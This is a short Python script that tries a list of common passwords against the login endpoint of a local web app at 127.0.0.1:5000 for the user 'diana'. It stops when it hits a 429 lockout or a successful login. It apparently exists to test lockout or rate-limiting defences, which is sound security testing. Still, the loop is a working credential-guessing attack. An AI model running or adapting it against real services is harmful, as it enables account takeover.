import requests
import time

BASE_URL = "http://127.0.0.1:5000"

def login(username: str, password: str):
    r = requests.post(
        f"{BASE_URL}/login",
        json={"username": username, "password": password},
        timeout=10
    )
    try:
        body = r.json()
    except ValueError:
        body = {"raw": r.text}
    return r.status_code, body

def main():
    target_username = "diana"
    common_passwords = [
        "123456",
        "password",
        "qwerty",
        "abc123",
        "letmein",
        "hacked123",
        "Diana",
        "Test123!",
    ]

    for pwd in common_passwords:
        print(f"Trying password: {pwd}")
        status, body = login(target_username, pwd)
        print(f"Status: {status}, Response: {body}")

        if status == 429:
            print("Lockout triggered: too many failed login attempts.")
            break

        if status == 200 and isinstance(body, dict) and body.get("success") is True:
            print(f"Success! Found password: {pwd}")
            break
        time.sleep(1)  

if __name__ == "__main__":
    main()